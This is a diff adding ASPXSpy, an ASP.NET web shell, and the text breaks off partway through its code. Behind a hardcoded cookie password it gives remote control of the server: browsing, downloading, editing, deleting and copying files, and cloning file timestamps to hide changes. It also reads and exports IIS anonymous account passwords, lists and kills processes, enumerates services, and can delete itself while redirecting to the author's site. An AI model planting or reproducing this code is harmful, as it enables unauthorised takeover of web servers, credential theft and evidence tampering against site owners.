@@ -1,0 +1,2723 @@
+<%@ Page Language="C#" Debug="true" trace="false" validateRequest="false" EnableViewStateMac="false" EnableViewState="true"%>
+<%@ import Namespace="System.IO"%>
+<%@ import Namespace="System.Diagnostics"%>
+<%@ import Namespace="System.Data"%>
+<%@ import Namespace="System.Management"%>
+<%@ import Namespace="System.Data.OleDb"%>
+<%@ import Namespace="Microsoft.Win32"%>
+<%@ import Namespace="System.Net.Sockets" %>
+<%@ import Namespace="System.Net" %>
+<%@ import Namespace="System.Runtime.InteropServices"%>
+<%@ import Namespace="System.DirectoryServices"%>
+<%@ import Namespace="System.ServiceProcess"%>
+<%@ import Namespace="System.Text.RegularExpressions"%>
+<%@ Import Namespace="System.Threading"%>
+<%@ Import Namespace="System.Data.SqlClient"%>
+<%@ import Namespace="Microsoft.VisualBasic"%>
+<%@ Assembly Name="System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
+<%@ Assembly Name="System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
+<%@ Assembly Name="System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
+<%@ Assembly Name="Microsoft.VisualBasic,Version=7.0.3300.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a"%>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<script runat="server">
+/*
+Thanks Snailsor,FuYu,BloodSword,Cnqing,
+Code by Bin
+Make in China
+Blog: http://www.rootkit.net.cn
+E-mail : master@rootkit.net.cn
+*/
+public string Password="tkwpcjs";//admin
+public string hrdI="ASPXSpy";
+public int OEmf=1;
+protected OleDbConnection WDmM=new OleDbConnection();
+protected OleDbCommand QQdt=new OleDbCommand();
+public NetworkStream NS=null;
+public NetworkStream NS1=null;
+TcpClient tcp=new TcpClient();
+TcpClient AyFj=new TcpClient();
+ArrayList kAtA=new ArrayList();
+protected void Page_load(object sender,EventArgs e)
+{
+TzA(this);
+if (!hQDJQ())
+{
+return;
+}
+if(IsPostBack)
+{
+Eecd();
+string ufXRb=Request["__EVENTTARGET"];
+string DSpv=Request["__File"];
+if(ufXRb!="")
+{
+switch(ufXRb)
+{
+case "Bin_Parent":
+BWRS(RbeOm(DSpv));
+break;
+case "Bin_Listdir":
+BWRS(RbeOm(DSpv));
+break;
+case "Csju":
+Csju(RbeOm(DSpv));
+break;
+case "Bin_Createfile":
+DjMX(DSpv);
+break;
+case "Bin_Editfile":
+DjMX(DSpv);
+break;
+case "Bin_Createdir":
+ujw(DSpv);
+break;
+case "qNYH":
+qNYH(DSpv);
+break;
+case "BfmR":
+BfmR(RbeOm(DSpv));
+break;
+case "rqVE":
+rqVE(DSpv);
+break;
+case "Bin_Regread":
+pkYH(RbeOm(DSpv));
+break;
+case "zkdC":
+zkdC();
+break;
+case "ubJMk":
+ubJMk(DSpv);
+break;
+}
+if(ufXRb.StartsWith("FuUZ"))
+{
+FuUZ(RbeOm(ufXRb.Replace("FuUZ","")),DSpv);
+}
+else if(ufXRb.StartsWith("KZa"))
+{
+KZa(RbeOm(ufXRb.Replace("KZa","")),DSpv);
+}
+else if(ufXRb.StartsWith("Bin_CFile"))
+{
+tYE(RbeOm(ufXRb.Replace("Bin_CFile","")),DSpv);
+}
+}
+}
+else
+{
+Qvp();
+}
+}
+// MAIN VOID
+public bool hQDJQ()
+{
+if(Request.Cookies[hrdI]==null)
+{
+aDWs();
+return false;
+}
+else
+{
+if (Request.Cookies[hrdI].Value != Password)
+{
+aDWs();
+return false;
+}
+else
+{
+return true;
+}
+}
+}
+public void aDWs()
+{
+men.Visible=true;
+LmtA.Visible=false;
+}
+protected void YsNJo(object sender,EventArgs e)
+{
+Session.Abandon();
+Response.Cookies.Add(new HttpCookie(hrdI,null));
+aDWs();
+}
+public void Qvp()
+{
+LmtA.Visible=true;
+men.Visible=false;
+Bin_Button_CreateFile.Attributes["onClick"]="var filename=prompt('Please input the file name:','');if(filename){Bin_PostBack('Bin_Createfile',filename);}";
+Bin_Button_CreateDir.Attributes["onClick"]="var filename=prompt('Please input the directory name:','');if(filename){Bin_PostBack('Bin_Createdir',filename);}";
+Bin_Button_KillMe.Attributes["onClick"]="if(confirm('Are you sure delete ASPXSPY?')){Bin_PostBack('zkdC','');};";
+Bin_Span_Sname.InnerHtml=Request.ServerVariables["LOCAL_ADDR"]+":"+Request.ServerVariables["SERVER_PORT"]+"("+Request.ServerVariables["SERVER_NAME"]+")";
+Bin_Span_FrameVersion.InnerHtml="Framework Ver : "+Environment.Version.ToString();
+//VEhV.Value=uDFn(Server.MapPath("."));
+if (VEhV.Value==string.Empty)
+{
+VEhV.Value=uDFn(Server.MapPath("."));
+}
+Bin_H2_Title.InnerText="File Manager >>";
+BWRS(VEhV.Value);
+}
+public void Eecd()
+{
+string[] WNR=Directory.GetLogicalDrives();
+for(int i=0;i<WNR.Length;i++)
+{
+Control c=ParseControl(" <asp:LinkButton Text='"+WXt(WNR[i])+"' ID=\"Bin_Button_Driv"+i+"\" runat='server' commandargument= '"+WNR[i]+"'/> | ");
+Bin_Span_Drv.Controls.Add(c);
+LinkButton Fzy=(LinkButton)Page.FindControl("Bin_Button_Driv"+i);
+Fzy.Command+=new CommandEventHandler(this.athT);
+}
+}
+public string uDFn(string path)
+{
+if(path.Substring(path.Length-1,1)!=@"\")
+{
+path=path+@"\";
+}
+return path;
+}
+public string aVjJ(string path)
+{
+char[] trim={'\\'};
+if(path.Substring(path.Length-1,1)==@"\")
+{
+path=path.TrimEnd(trim);
+}
+return path;
+}
+[DllImport("kernel32.dll",EntryPoint="GetDriveTypeA")]
+public static extern int iWMkI(string nDrive);
+public string WXt(string instr)
+{
+string XNj=string.Empty;
+int num=iWMkI(instr);
+switch(num)
+{
+case 1:
+XNj="Unknow("+instr+")";
+break;
+case 2:
+XNj="Removable("+instr+")";
+break;
+case 3:
+XNj="Fixed("+instr+")";
+break;
+case 4:
+XNj="Network("+instr+")";
+break;
+case 5:
+XNj="CDRom("+instr+")";
+break;
+case 6:
+XNj="RAM Disk("+instr+")";
+break;
+}
+return XNj.Replace(@"\","");
+}
+public string kCSO(string instr)
+{
+byte[] tmp=Encoding.Default.GetBytes(instr);
+return Convert.ToBase64String(tmp);
+}
+public string RbeOm(string instr)
+{
+byte[] tmp=Convert.FromBase64String(instr);
+return Encoding.Default.GetString(tmp);
+}
+public void BWRS(string path)
+{
+gESS();
+EMm.Visible=true;
+Bin_H2_Title.InnerText="File Manager >>";
+VEhV.Value=uDFn(path);
+DirectoryInfo QJdf=new DirectoryInfo(path);
+if(Directory.GetParent(aVjJ(path))!=null)
+{
+string bg=sTBx();
+TableRow p=new TableRow();
+for(int i=1;i<6;i++)
+{
+TableCell pc=new TableCell();
+if(i==1)
+{
+pc.Width=Unit.Parse("2%");
+pc.Text="0";
+p.CssClass=bg;
+}
+if(i==2)
+{
+pc.Text="<a href=\"javascript:Bin_PostBack('Bin_Parent','"+kCSO(Directory.GetParent(aVjJ(path)).ToString())+"')\">Parent Directory</a>";
+}
+p.Cells.Add(pc);
+bsWk.Rows.Add(p);
+}
+}
+try
+{
+int XlzR=0;
+foreach(DirectoryInfo Bin_folder in QJdf.GetDirectories())
+{
+string bg=sTBx();
+XlzR++;
+TableRow tr=new TableRow();
+TableCell tc=new TableCell();
+tc.Width=Unit.Parse("2%");
+tc.Text="0";
+tr.Attributes["onmouseover"]="this.className='focus';";
+tr.CssClass=bg;
+tr.Attributes["onmouseout"]="this.className='"+bg+"';";
+tr.Cells.Add(tc);
+TableCell UMc=new TableCell();
+UMc.Text="<a href=\"javascript:Bin_PostBack('Bin_Listdir','"+kCSO(VEhV.Value+Bin_folder.Name)+"')\">"+Bin_folder.Name+"</a>";
+tr.Cells.Add(UMc);
+TableCell pubL=new TableCell();
+pubL.Text=Bin_folder.LastWriteTimeUtc.ToString("yyyy-MM-dd hh:mm:ss");
+tr.Cells.Add(pubL);
+bsWk.Rows.Add(tr);
+TableCell GEo=new TableCell();
+GEo.Text="--";
+tr.Cells.Add(GEo);
+bsWk.Rows.Add(tr);
+TableCell ibMN=new TableCell();
+ibMN.Text="<a href=\"javascript:if(confirm('Are you sure will delete it ?\\n\\nIf non-empty directory,will be delete all the files.')){Bin_PostBack('Csju','"+kCSO(VEhV.Value+Bin_folder.Name)+"')};\">Del</a> | <a href='#' onclick=\"var filename=prompt('Please input the new folder name:','"+VEhV.Value.Replace(@"\",@"\\")+Bin_folder.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('FuUZ"+kCSO(VEhV.Value+Bin_folder.Name)+"',filename);} \">Rename</a>";
+tr.Cells.Add(ibMN);
+bsWk.Rows.Add(tr);
+}
+TableRow EPPkP=new TableRow();
+EPPkP.Attributes["style"]="border-top:1px solid #fff;border-bottom:1px solid #ddd;";
+EPPkP.Attributes["bgcolor"]="#dddddd";
+TableCell kGnFx=new TableCell();
+kGnFx.Attributes["colspan"]="6" ;
+kGnFx.Attributes["height"]="5";
+EPPkP.Cells.Add(kGnFx);
+bsWk.Rows.Add(EPPkP);
+int IYF=0;
+foreach(FileInfo Bin_Files in QJdf.GetFiles())
+{
+IYF++;
+string gb=sTBx();
+TableRow tr=new TableRow();
+TableCell tc=new TableCell();
+tc.Width=Unit.Parse("2%");
+tc.Text="<input type=\"checkbox\" value=\"0\" name=\""+kCSO(Bin_Files.Name)+"\">";
+tr.Attributes["onmouseover"]="this.className='focus';";
+tr.CssClass=gb;
+tr.Attributes["onmouseout"]="this.className='"+gb+"';";
+tr.Cells.Add(tc);
+TableCell filename=new TableCell();
+//Response.Write(Bin_Files.FullName+"|"+Request.PhysicalApplicationPath+"|");
+//Response.Write(Bin_Files.FullName.StartsWith(Request.PhysicalApplicationPath));
+if(Bin_Files.FullName.StartsWith(Request.PhysicalApplicationPath))
+{
+string url=Request.Url.ToString();
+filename.Text="<a href=\""+Bin_Files.FullName.Replace(Request.PhysicalApplicationPath,url.Substring(0,url.IndexOf('/',8)+1)).Replace("\\","/")+"\" target=\"_blank\">"+Bin_Files.Name+"</a>";
+}
+else
+{
+filename.Text=Bin_Files.Name;
+}
+//filename.Text=Bin_Files.Name;
+TableCell qWTvS=new TableCell();
+qWTvS.Text=Bin_Files.LastWriteTimeUtc.ToString("yyyy-MM-dd hh:mm:ss");
+TableCell IpI=new TableCell();
+IpI.Text=YOls(Bin_Files.Length);
+TableCell TYQk=new TableCell();
+TYQk.Text="<a href=\"#\" onclick=\"Bin_PostBack('BfmR','"+kCSO(VEhV.Value+Bin_Files.Name)+"')\">Down</a> | <a href='#' onclick=\"var filename=prompt('Please input the new path(full path):','"+VEhV.Value.Replace(@"\",@"\\")+Bin_Files.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('Bin_CFile"+kCSO(VEhV.Value+Bin_Files.Name)+"',filename);} \">Copy</a> | <a href=\"#\" onclick=\"Bin_PostBack('Bin_Editfile','"+Bin_Files.Name+"')\">Edit</a> | <a href='#' onclick=\"var filename=prompt('Please input the new file name(full path):','"+VEhV.Value.Replace(@"\",@"\\")+Bin_Files.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('KZa"+kCSO(VEhV.Value+Bin_Files.Name)+"',filename);} \">Rename</a> | <a href=\"#\" onclick=\"Bin_PostBack('qNYH','"+Bin_Files.Name+"')\">Time</a> ";
+tr.Cells.Add(filename);
+tr.Cells.Add(qWTvS);
+tr.Cells.Add(IpI);
+tr.Cells.Add(TYQk);
+bsWk.Rows.Add(tr);
+}
+string lgb=sTBx();
+TableRow fQeq=new TableRow();
+fQeq.CssClass=lgb;
+for(int i=1;i<4;i++)
+{
+TableCell jNrL=new TableCell();
+if(i==1)
+{
+jNrL.Text="<input name=\"chkall\" value=\"on\" type=\"checkbox\" onclick=\"var ck=document.getElementsByTagName('input');for(var i=0;i<ck.length-1;i++){if(ck[i].type=='checkbox'&&ck[i].name!='chkall'){ck[i].checked=forms[0].chkall.checked;}}\"/>";
+}
+if(i==2)
+{
+jNrL.Text="<a href=\"#\" Onclick=\"var d_file='';var ck=document.getElementsByTagName('input');for(var i=0;i<ck.length-1;i++){if(ck[i].checked&&ck[i].name!='chkall'){d_file+=ck[i].name+',';}};if(d_file==null || d_file==''){ return;} else {if(confirm('Are you sure delete the files ?')){Bin_PostBack('rqVE',d_file)};}\">Delete selected</a>";
+}
+if(i==3)
+{
+jNrL.ColumnSpan=4;
+jNrL.Style.Add("text-align","right");
+jNrL.Text=XlzR+" directories/ "+IYF+" files";
+}
+fQeq.Cells.Add(jNrL);
+}
+bsWk.Rows.Add(fQeq);
+}
+catch(Exception error)
+{
+ECIxe(error.Message);
+}
+}
+public string sTBx()
+{
+OEmf++;
+if(OEmf % 2==0)
+{
+return "alt1";
+}
+else
+{
+return "alt2";
+}
+}
+public void Csju(string meC)
+{
+try
+{
+Directory.Delete(meC,true);
+ECIxe("Directory delete new success !");
+}
+catch(Exception error)
+{
+ECIxe(error.Message);
+}
+BWRS(Directory.GetParent(meC).ToString());
+}
+public void FuUZ(string sdir,string ddir)
+{
+try
+{
+Directory.Move(sdir,ddir);
+ECIxe("Directory Renamed Success !");
+}
+catch(Exception error)
+{
+ECIxe(error.Message);
+}
+BWRS(VEhV.Value);
+}
+public void KZa(string sfile,string dfile)
+{
+try
+{
+File.Move(sfile,dfile);
+ECIxe("File Renamed Success !");
+}
+catch(Exception error)
+{
+ECIxe(error.Message);
+}
+BWRS(VEhV.Value);
+}
+public void tYE(string spath,string dpath)
+{
+try
+{
+File.Copy(spath,dpath);
+ECIxe("File Copy Success !");
+}
+catch(Exception error)
+{
+ECIxe(error.Message);
+}
+BWRS(VEhV.Value);
+}
+public void ujw(string path)
+{
+try
+{
+Directory.CreateDirectory(VEhV.Value+path);
+ECIxe("Directory created success !");
+}
+catch(Exception error)
+{
+ECIxe(error.Message);
+}
+BWRS(VEhV.Value);
+}
+public void DjMX(string path)
+{
+if(Request["__EVENTTARGET"]=="Bin_Editfile" || Request["__EVENTTARGET"]=="Bin_Createfile")
+{
+foreach(ListItem item in InfsC.Items)
+{
+if(item.Selected=true)
+{
+item.Selected=false;
+}
+}
+}
+Bin_H2_Title.InnerHtml="Create/ Edit File >>";
+gESS();
+iVn.Visible=true;
+if(path.IndexOf(":")< 0)
+{
+IihO.Value=VEhV.Value+path;
+}
+else
+{
+IihO.Value=path;
+}
+if(File.Exists(IihO.Value))
+{
+StreamReader sr;
+if(InfsC.SelectedItem.Text=="UTF-8")
+{
+sr=new StreamReader(IihO.Value,Encoding.UTF8);
+}
+else
+{
+sr=new StreamReader(IihO.Value,Encoding.Default);
+}
+ZPW.InnerText=sr.ReadToEnd();
+sr.Close();
+}
+else
+{
+ZPW.InnerText=string.Empty;
+}
+}
+public void BfmR(string path)
+{
+FileInfo fs=new FileInfo(path);
+Response.Clear();
+Page.Response.ClearHeaders();
+Page.Response.Buffer=false;
+this.EnableViewState=false;
+Response.AddHeader("Content-Disposition","attachment;filename="+HttpUtility.UrlEncode(fs.Name,System.Text.Encoding.UTF8));
+Response.AddHeader("Content-Length",fs.Length.ToString());
+Page.Response.ContentType="application/unknown";
+Response.WriteFile(fs.FullName);
+Page.Response.Flush();
+Page.Response.Close();
+Response.End();
+Page.Response.Clear();
+}
+public void rqVE(string path)
+{
+try
+{
+string[] pOz=path.Split(',');
+for(int i=0;i<pOz.Length-1;i++)
+{
+File.Delete(VEhV.Value+RbeOm(pOz[i]));
+}
+ECIxe("File Delete Success !");
+}
+catch(Exception error)
+{
+ECIxe(error.Message);
+}
+BWRS(VEhV.Value);
+}
+public void zkdC()
+{
+try
+{
+File.Delete(Request.PhysicalPath);
+Response.Redirect("http://www.rootkit.net.cn");
+}
+catch(Exception error)
+{
+ECIxe(error.Message);
+}
+}
+public void qNYH(string path)
+{
+Bin_H2_Title.InnerHtml="Clone file was last modified time >>";
+gESS();
+oMPI.Visible=true;
+DDNRa.Value=VEhV.Value+path;
+mvriq.Value=VEhV.Value;
+NuKR.Value=VEhV.Value+path;
+string Att=File.GetAttributes(DDNRa.Value).ToString();
+if(Att.LastIndexOf("ReadOnly")!=-1)
+{
+nNKXe.Checked=true;
+}
+if(Att.LastIndexOf("System")!=-1)
+{
+zOQHD.Checked=true;
+}
+if(Att.LastIndexOf("Hidden")!=-1)
+{
+PdEJ.Checked=true;
+}
+if(Att.LastIndexOf("Archive")!=-1)
+{
+zAV.Checked=true;
+}
+fsR.Value=File.GetCreationTimeUtc(NuKR.Value).ToString();
+nhAM.Value=File.GetLastWriteTimeUtc(NuKR.Value).ToString();
+eEm.Value=File.GetLastAccessTimeUtc(NuKR.Value).ToString();
+}
+public static String YOls(Int64 fileSize)
+{
+if(fileSize<0)
+{
+throw new ArgumentOutOfRangeException("fileSize");
+}
+else if(fileSize >= 1024 * 1024 * 1024)
+{
+return string.Format("{0:########0.00} G",((Double)fileSize)/(1024 * 1024 * 1024));
+}
+else if(fileSize >= 1024 * 1024)
+{
+return string.Format("{0:####0.00} M",((Double)fileSize)/(1024 * 1024));
+}
+else if(fileSize >= 1024)
+{
+return string.Format("{0:####0.00} K",((Double)fileSize)/ 1024);
+}
+else
+{
+return string.Format("{0} B",fileSize);
+}
+}
+private bool JBL(string sSrc)
+{
+Regex reg=new Regex(@"^0|[0-9]*[1-9][0-9]*$");
+if(reg.IsMatch(sSrc))
+{
+return true;
+}
+else
+{
+return false;
+}
+}
+public void YKS()
+{
+string meC=string.Empty;
+string JPCr="IIS://localhost/W3SVC";
+sXHZB.Style.Add("word-break","break-all");
+try
+{
+DirectoryEntry QYpx=new DirectoryEntry(JPCr);
+int ivlIL=0;
+foreach(DirectoryEntry child in QYpx.Children)
+{
+if(JBL(child.Name.ToString()))
+{
+ivlIL++;
+DirectoryEntry newdir=new DirectoryEntry(JPCr+"/"+child.Name.ToString());
+DirectoryEntry LQw=newdir.Children.Find("root","IIsWebVirtualDir");
+string bg=sTBx();
+TableRow TR=new TableRow();
+TR.Attributes["onmouseover"]="this.className='focus';";
+TR.CssClass=bg;
+TR.Attributes["onmouseout"]="this.className='"+bg+"';";
+TR.Attributes["title"]="Site:"+child.Properties["ServerComment"].Value.ToString();
+for(int i=1;i<6;i++)
+{
+try
+{
+TableCell bJf=new TableCell();
+switch(i)
+{case 1:
+bJf.Text=ivlIL.ToString();
+break;
+case 2:
+bJf.Text=LQw.Properties["AnonymousUserName"].Value.ToString();
+break;
+case 3:
+bJf.Text=LQw.Properties["AnonymousUserPass"].Value.ToString();
+break;
+case 4:
+StringBuilder sb=new StringBuilder();
+PropertyValueCollection pc=child.Properties["ServerBindings"];
+for (int j=0; j < pc.Count; j++)
+{
+sb.Append(pc[j].ToString()+"<br>");
+}
+bJf.Text=sb.ToString().Substring(0,sb.ToString().Length-4);
+break;
+case 5:
+bJf.Text="<a href=\"javascript:Bin_PostBack('Bin_Listdir','"+kCSO(LQw.Properties["Path"].Value.ToString())+"')\">"+LQw.Properties["Path"].Value.ToString()+"</a>";
+break;
+}
+TR.Cells.Add(bJf);
+}
+catch (Exception ex)
+{
+ECIxe(ex.Message);
+continue;
+}
+}
+sXHZB.Controls.Add(TR);
+}
+}
+}
+catch(Exception error)
+{
+gbqd();
+}
+}
+public void gbqd()
+{
+try
+{
+int ivlIL=0;
+ManagementScope yal=new ManagementScope(@"\\.\root\MicrosoftIISv2");
+yal.Connect();
+ObjectQuery wUg=new ObjectQuery("SELECT Name,AnonymousUserName,AnonymousUserPass,Path FROM IISWebVirtualDirSetting");
+ManagementObjectSearcher rCz=new ManagementObjectSearcher(yal,wUg);
+ManagementObjectCollection yrlV=rCz.Get();
+foreach(ManagementObject objmanage in yrlV)
+{
+ivlIL++;
+string bg=sTBx();
+TableRow TR=new TableRow();
+TR.Attributes["onmouseover"]="this.className='focus';";
+TR.CssClass=bg;
+TR.Attributes["onmouseout"]="this.className='"+bg+"';";
+for(int i=1;i<6;i++)
+{
+try
+{
+TableCell bJf=new TableCell();
+switch (i)
+{
+case 1:
+bJf.Text=ivlIL.ToString();
+break;
+case 2:
+bJf.Text=objmanage["AnonymousUserName"].ToString();
+break;
+case 3:
+bJf.Text=objmanage["AnonymousUserPass"].ToString();
+break;
+case 4:
+wUg=new ObjectQuery("SELECT ServerComment,ServerBindings from IISWebServerSetting where Name='"+Strings.Replace(objmanage["Name"].ToString(),"/root","",1,-1,CompareMethod.Text)+"'");
+rCz=new ManagementObjectSearcher(yal,wUg);
+ManagementObjectCollection lemi=rCz.Get();
+foreach(ManagementObject objsvr in lemi)
+{
+StringBuilder sb=new StringBuilder();
+TR.Attributes["title"]="Site:"+objsvr["ServerComment"];
+foreach(ManagementBaseObject objbind in (ManagementBaseObject[])objsvr["ServerBindings"])
+{
+sb.Append(objbind["IP"].ToString()+":"+objbind["Port"].ToString()+":"+objbind["Hostname"].ToString()+"<br>");
+}
+bJf.Text=sb.ToString().Substring(0,sb.ToString().Length-4);
+}
+break;
+case 5:
+bJf.Text="<a href=\"javascript:Bin_PostBack('Bin_Listdir','"+kCSO(objmanage["Path"].ToString())+"')\">"+objmanage["Path"].ToString()+"</a>";
+break;
+}
+TR.Cells.Add(bJf);
+}
+catch (Exception ex)
+{
+ECIxe(ex.Message);
+continue;
+}
+}
+sXHZB.Controls.Add(TR);
+}
+}
+catch (Exception ex)
+{
+ECIxe(ex.Message);
+}
+}
+public void yfIo(object sender,EventArgs e)
+{
+string meC=string.Empty;
+string JPCr="IIS://localhost/W3SVC";
+string pPwP="<table width=\"100%\" border=1 cellpadding=0 cellspacing=0><tr><td>IIS Spy</td><td Width=\"15%\">IIS_USER</td><td Width=\"15%\">IIS_PASS</td><td Width=\"20%\">Domain</td><td Width=\"30%\">Path</td></tr>\r\n";
+try
+{
+DirectoryEntry QYpx=new DirectoryEntry(JPCr);
+int ivlIL=0;
+foreach(DirectoryEntry child in QYpx.Children)
+{
+try
+{
+if (JBL(child.Name.ToString()))
+{
+ivlIL++;
+DirectoryEntry newdir=new DirectoryEntry(JPCr+"/"+child.Name.ToString());
+DirectoryEntry LQw=newdir.Children.Find("root","IIsWebVirtualDir");
+string[] jGg=child.Properties["ServerBindings"][0].ToString().Split(':');
+string url=jGg[2];
+if (jGg[1]=="443")
+{
+url="https://"+url;
+}
+else
+{
+url="http://"+url;
+if (jGg[1]!="80")
+{
+url+=":"+jGg[1];
+}
+}
+url+="/";
+pPwP+="<tr>";
+pPwP+="<td>"+ivlIL.ToString()+"</td>";
+pPwP+="<td>"+LQw.Properties["AnonymousUserName"].Value.ToString()+"</td>";
+pPwP+="<td>"+LQw.Properties["AnonymousUserPass"].Value.ToString()+"</td>";
+pPwP+="<td>"+jGg[0]+":"+jGg[1]+":";
+if (jGg[2].Length >= 1)
+{
+pPwP+="<a href='"+url+"' target='_blank'>"+jGg[2]+"</>";
+}
+pPwP+="</td>";
+pPwP+="<td>"+LQw.Properties["Path"].Value.ToString()+"</td>";
+pPwP+="</tr>";
+}
+}
+catch (Exception ex)
+{
+continue;
+}
+}
+pPwP+="</table>";
+}
+catch(Exception error)
+{
+pPwP+=(error.Message);
+}
+Response.AddHeader("Content-Disposition","attachment;filename=IIS_Info-"+Request.ServerVariables["LOCAL_ADDR"]+".html");
+Response.AddHeader("Content-Length",pPwP.Length.ToString());
+Page.Response.ContentType="text/html";
+Response.Write(pPwP);
+Response.End();
+}
+public ManagementObjectCollection XtMS(string query)
+{
+ManagementObjectSearcher QS=new ManagementObjectSearcher(new SelectQuery(query));
+return QS.Get();
+}
+public DataTable Awr(string query)
+{
+DataTable dt=new DataTable();
+int i=0;
+ManagementObjectSearcher QS=new ManagementObjectSearcher(new SelectQuery(query));
+try
+{
+foreach(ManagementObject m in QS.Get())
+{
+DataRow dr=dt.NewRow();
+PropertyDataCollection.PropertyDataEnumerator oEnum;
+oEnum=(m.Properties.GetEnumerator()as PropertyDataCollection.PropertyDataEnumerator);
+while(oEnum.MoveNext())
+{
+PropertyData AiAt=(PropertyData)oEnum.Current;
+if(dt.Columns.IndexOf(AiAt.Name)==-1)
+{
+dt.Columns.Add(AiAt.Name);
+dt.Columns[dt.Columns.Count-1].DefaultValue="";
+}
+if(m[AiAt.Name]!=null)
+{
+dr[AiAt.Name]=m[AiAt.Name].ToString();
+}
+else
+{
+dr[AiAt.Name]=string.Empty;
+}
+}
+dt.Rows.Add(dr);
+}
+}
+catch(Exception error)
+{
+// ECIxe(error.Message);
+}
+return dt;
+}
+public void iJCYf()
+{
+try
+{
+Bin_H2_Title.InnerText="Process >>";
+gESS();
+VqmIE.Visible=true;
+int iCyx=0;
+Process[] p=Process.GetProcesses();
+foreach(Process sp in p)
+{
+iCyx++;
+string bg=sTBx();
+TableRow tr=new TableRow();
+tr.Attributes["onmouseover"]="this.className='focus';";
+tr.CssClass=bg;
+tr.Attributes["onmouseout"]="this.className='"+bg+"';";
+for(int i=1;i<7;i++)
+{
+TableCell td=new TableCell();
+if(i==1)
+{
+td.Width=Unit.Parse("2%");
+td.Text=iCyx.ToString();
+tr.Controls.Add(td);
+}
+if(i==2)
+{
+td.Text=sp.Id.ToString();
+tr.Controls.Add(td);
+}
+if(i==3)
+{
+td.Text=sp.ProcessName.ToString();
+tr.Controls.Add(td);
+}
+if(i==4)
+{
+td.Text=sp.Threads.Count.ToString();
+tr.Controls.Add(td);
+}
+if(i==5)
+{
+td.Text=sp.BasePriority.ToString();
+tr.Controls.Add(td);
+}
+if(i==6)
+{
+td.Text="--";
+tr.Controls.Add(td);
+}
+}
+CuE.Controls.Add(tr);
+}
+}
+catch(Exception error)
+{
+gKB();
+}
+gKB();
+}
+public void gKB()
+{
+try
+{
+Bin_H2_Title.InnerText="Process >>";
+gESS();
+VqmIE.Visible=true;
+int iCyx=0;
+DataTable dt=Awr("Win32_Process");
+for(int j=0;j<dt.Rows.Count;j++)
+{
+iCyx++;
+string bg=sTBx();
+TableRow tr=new TableRow();
+tr.Attributes["onmouseover"]="this.className='focus';";
+tr.CssClass=bg;
+tr.Attributes["onmouseout"]="this.className='"+bg+"';";
+for(int i=1;i<7;i++)
+{
+TableCell td=new TableCell();
+if(i==1)
+{
+td.Width=Unit.Parse("2%");
+td.Text=iCyx.ToString();
+tr.Controls.Add(td);
+}
+if(i==2)
+{
+td.Text=dt.Rows[j]["ProcessID"].ToString();
+tr.Controls.Add(td);
+}
+if(i==3)
+{
+td.Text=dt.Rows[j]["Name"].ToString();
+tr.Controls.Add(td);
+}
+if(i==4)
+{
+td.Text=dt.Rows[j]["ThreadCount"].ToString();
+tr.Controls.Add(td);
+}
+if(i==5)
+{
+td.Text=dt.Rows[j]["Priority"].ToString();
+tr.Controls.Add(td);
+}
+if(i==6)
+{
+if( dt.Rows[j]["CommandLine"]!=string.Empty)
+{
+td.Text="<a href=\"javascript:Bin_PostBack('ubJMk','"+dt.Rows[j]["ProcessID"].ToString()+"')\">Kill</a>";
+}
+else
+{
+td.Text="--";
+}
+tr.Controls.Add(td);
+}
+}
+CuE.Controls.Add(tr);
+}
+}
+catch(Exception error)
+{
+ECIxe(error.Message);
+}
+}
+public void ubJMk(string pid)
+{
+try
+{
+foreach(ManagementObject p in XtMS("Select * from Win32_Process Where ProcessID ='"+pid+"'"))
+{
+p.InvokeMethod("Terminate",null);
+p.Dispose();
+}
+ECIxe("Process Kill Success !");
+}
+catch(Exception error)
+{
+ECIxe(error.Message);
+}
+gKB();
+}
+public void MZEy()
+{
+try
+{
+Bin_H2_Title.InnerText="Services >>";
+gESS();
+naEZ.Visible=true;
+int iCyx=0;
+ServiceController[] KtT=System.ServiceProcess.ServiceController.GetServices();
+for(int i=0;i<KtT.Length;i++)
+{
+iCyx++;
+string bg=sTBx();
+TableRow tr=new TableRow();
+tr.Attributes["onmouseover"]="this.className='focus';";
+tr.CssClass=bg;
+tr.Attributes["onmouseout"]="this.className='"+bg+"';";
+////tr.Attributes["title"]=dt.Rows[j]["Description"].ToString();
+for(int b=1;b<7;b++)
+{
+TableCell td=new TableCell();
+if(b==1)
+{
+td.Width=Unit.Parse("2%");
+td.Text=iCyx.ToString();
+tr.Controls.Add(td);
+}
+if(b==2)
+{
+td.Text="null";
+tr.Controls.Add(td);
+}
+if(b==3)
+{
+td.Text=KtT[i].ServiceName.ToString();
+tr.Controls.Add(td);
+}
+if(b==4)
+{
+td.Text="";
+tr.Controls.Add(td);
+}
+if(b==5)
+{
+string ilH=KtT[i].Status.ToString();
+if(ilH=="Running")
+{
+td.Text="<font color=green>"+ilH+"</font>";
+}
+else
+{
+td.Text="<font color=red>"+ilH+"</font>";
+}
+tr.Controls.Add(td);
+}
+if(b==6)
+{
+td.Text="";
+tr.Controls.Add(td);
+}
+}
+lgBS.Controls.Add(tr);
+}
+}
+catch(Exception error)
+{
+ECIxe(error.Message);
+}
+}
+public void Zrn()
+{
+try
+{
+Bin_H2_Title.InnerText="Services >>";
+gESS();
+naEZ.Visible=true;
+int iCyx=0;
+DataTable dt=Awr("Win32_Service");
+for(int j=0;j<dt.Rows.Count;j++)
+{
+iCyx++;
+string bg=sTBx();
+TableRow tr=new TableRow();
+tr.Attributes["onmouseover"]="this.className='focus';";
+tr.CssClass=bg;
+tr.Attributes["onmouseout"]="this.className='"+bg+"';";
+tr.Attributes["title"]=dt.Rows[j]["Description"].ToString();
+for(int i=1;i<7;i++)
+{
+TableCell td=new TableCell();
+if(i==1)
+{
+td.Width=Unit.Parse("2%");
+td.Text=iCyx.ToString();
+tr.Controls.Add(td);
+}
+if(i==2)
+{
+td.Text=dt.Rows[j]["ProcessID"].ToString();
+tr.Controls.Add(td);
+}
+if(i==3)
+{
